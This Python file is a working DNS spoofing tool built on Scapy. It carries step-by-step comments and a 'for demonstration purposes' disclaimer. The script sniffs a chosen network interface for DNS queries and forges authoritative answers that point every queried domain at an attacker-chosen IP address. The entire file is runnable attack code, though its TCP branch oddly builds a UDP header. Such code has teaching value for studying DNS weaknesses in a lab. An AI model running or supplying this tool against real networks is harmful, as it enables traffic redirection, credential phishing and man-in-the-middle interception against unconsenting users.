#!/usr/bin/env python
# This code is strictly for demonstration purposes.
# If used in any other way or for any other purposes. In no way am I responsible
# for your actions or any damage which may occur as a result of its usage
# dnsSpoof.py
# Author: Nik Alleyne - nikalleyne at gmail dot com
# http://securitynik.blogspot.com

# from os import uname  # part of os check function
from subprocess import call
from sys import argv, exit
from time import ctime  # sleep (removed)
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP, TCP
from scapy.layers.l2 import Ether


# def os_check():
#     if (uname()[0].strip() == 'Linux') or (uname()[0].strip() == 'linux '):
#         print(' Current system is Linux ... Good to go!!')
#     else:
#         print(' Not a Linux system ... Exiting ')
#         print(' This script is designed to work on Linux ... if you wish you can modify it for your OS ')
#         exit(0)


def usage():
    print(" Usage: ./dnsSpoof <interface> <IP of your DNS Server - this is more likely the IP on this system>")
    print(" e.g. ./dnsSpoof eth0 10.0.0.1")


def main():
    call('clear')
    # os_check()

    if len(argv) != 3:
        usage()
        exit(0)

    while 1:
        # Sniff the network for destination port 53 traffic
        print(' Sniffing for DNS Packet ')
        get_dns_packet = sniff(iface=argv[1], filter="dst port 53", count=1)

        # if the sniffed packet is a DNS Query, let's do some work
        if (get_dns_packet[0].haslayer(DNS)) and (get_dns_packet[0].getlayer(DNS).qr == 0) and (
                get_dns_packet[0].getlayer(DNS).qd.qtype == 1) and (get_dns_packet[0].getlayer(DNS).qd.qclass == 1):
            print('\n Got Query on %s ' % ctime())

            # Extract the src IP
            client_src_ip = get_dns_packet[0].getlayer(IP).src

            # Extract UDP or TCP Src port
            if get_dns_packet[0].haslayer(UDP):
                client_src_port = get_dns_packet[0].getlayer(UDP).sport
            elif get_dns_packet[0].haslayer(TCP):
                client_src_port = get_dns_packet[0].getlayer(TCP).sport
            else:
                pass
            # I'm not trying to figure out what you are ... moving on

            # Extract DNS Query ID. The Query ID is extremely important, as the response's Query ID must match the request Query ID
            client_dns_query_id = get_dns_packet[0].getlayer(DNS).id

            # Extract the Query Count
            client_dns_query_data_count = get_dns_packet[0].getlayer(DNS).qdcount

            # Extract client's current DNS server
            client_dns_server = get_dns_packet[0].getlayer(IP).dst

            # Extract the DNS Query. Obviously if we will respond to a domain query, we must reply to what was asked for.
            client_dns_query = get_dns_packet[0].getlayer(DNS).qd.qname

            print('Received Src IP:%s, \n Received Src Port: %d \n Received Query ID:%d \n Query Data Count:%d \n'
                  'Current DNS Server:%s \n DNS Query:%s ' %
                  (client_src_ip, client_src_port, client_dns_query_id, client_dns_query_data_count, client_dns_server,
                   client_dns_query))

            # Now that we have captured the clients request information. Let's go ahead and build our spoofed response
            # First let's set the spoofed source, which we will take from the 3rd argument entered at the command line
            spoofed_dns_server_ip = argv[2].strip()

            # Now that we have our source IP and we know the client's destination IP. Let's build our IP Header
            spoofed_ip_pkt = IP(src=spoofed_dns_server_ip, dst=client_src_ip)

            # Now let's move up the IP stack and build our UDP or TCP header
            # We know our source port will be 53. However, our destination port has to match our client's.
            # In addition, we don't know if this is UDP or TCP, so let's ensure we capture both

            if get_dns_packet[0].haslayer(UDP):
                spoofed_udp_tcp_packet = UDP(sport=53, dport=client_src_port)
            elif get_dns_packet[0].haslayer(TCP):
                spoofed_udp_tcp_packet = UDP(sport=53, dport=client_src_port)  # changed from spoofed_udp_tcpp_packet

            # Ok Time for the main course. Let's build out the DNS packet response. This is where the real work is done.
            # This section is where your knowledge of the DNS protocol comes into play. Don't be afraid if you don't know
            # do like I did and revisit the RFC :-)
            spoofed_dns_packet = DNS(id=client_dns_query_id,
                                     qr=1,
                                     opcode=get_dns_packet[0].getlayer(DNS).opcode,
                                     aa=1,
                                     rd=0,
                                     ra=0,
                                     z=0,
                                     rcode=0,
                                     qdcount=client_dns_query_data_count,
                                     ancount=1,
                                     nscount=1,
                                     arcount=1,
                                     qd=DNSQR(qname=client_dns_query,
                                              qtype=get_dns_packet[0].getlayer(DNS).qd.qtype,
                                              qclass=get_dns_packet[0].getlayer(DNS).qd.qclass),
                                     an=DNSRR(rrname=client_dns_query,
                                              rdata=argv[2].strip(),
                                              ttl=86400),
                                     ns=DNSRR(rrname=client_dns_query,
                                              type=2,
                                              ttl=86400,
                                              rdata=argv[2]),
                                     ar=DNSRR(rrname=client_dns_query,
                                              rdata=argv[2].strip()))

            # Now that we have built our packet, let's go ahead and send it on its merry way.
            print(' \n Sending spoofed response packet ')
            sendp(Ether() / spoofed_ip_pkt / spoofed_udp_tcp_packet / spoofed_dns_packet, iface=argv[1].strip(),
                  count=1)
            print(' Spoofed DNS Server: %s \n src port:%d dest port:%d ' % (spoofed_dns_server_ip, 53, client_src_port))

        else:
            pass


if __name__ == '__main__':
    main()
